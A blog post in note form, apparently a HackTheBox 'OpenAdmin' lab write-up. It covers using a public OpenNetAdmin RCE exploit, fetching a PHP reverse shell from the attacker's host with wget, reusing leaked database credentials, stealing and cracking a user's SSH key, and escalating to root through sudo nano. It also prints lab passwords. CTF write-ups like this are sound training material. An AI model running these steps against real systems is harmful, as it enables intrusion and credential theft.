---
layout: post
title:  "HackTheBox OpenAdmin Writeup"
tags: 
  - htb
  - writeup 
---

# user
- Scan ports with nc -> http and ssh ports open
- /music yields a pre-prod page
	- contact page
	- login / create account leads to an ONA dashboard
- /artwork yields a different company's site
	- similar to the music guy
	- rabbit hole with nothing useful
- Can use RCE exploit from internet to gain reverse sorta shell from ONA (ona specific exploit)
- Can use this half-shell to escalate to a full shell
- Friend I consulted's go-to is that most boxes have wget, curl or netcat -> can transfer file rom http to server
	- python SimpleHTTPServer
	- netcat 4444 -> listen for requests
	- make php script correct ports
		- mkdir www
		- cd www
		- cp path/to/php/rev/shell
		- python -m SimpleHTTPServer
		- wget http://your.ip.address:portrev/_shell.php (on the half rev. shell)
- Now you a full reverse shell
- Python3 spawn pty bash for better experience
- Database config file found in local/config with DB user and pass
- That password allows access to jimmy thru ssh
- Pass for jimmy is n1nj4W4rri0R!
- Use sftp to transfer linpeas (escalation scanner) onto jimmy's home dir
- ./linpeas.sh > output.txt and then less -R output.txt to see linpeas output
- /var/www/internal has really interesting writeable files that seem to allow access into Joanna's id_rsa
- ssh tunnel local forward the contents of that folder so that it's accessible to web
    - access w/ ssh openadmin -> localhost:2331/index.php
- Edit php to cat out joanna's private key
- Crack keyphrase using ssh2john -> john
- Bam, ssh into the target as joanna with new key (keyphrase is bloodninjas)
- User pwned
 
# root
- sudo -l 
- Can run nano on /opt/priv with nopasswd
- Execute a shell from within nano using a GTFOBins as root
- Root pwned
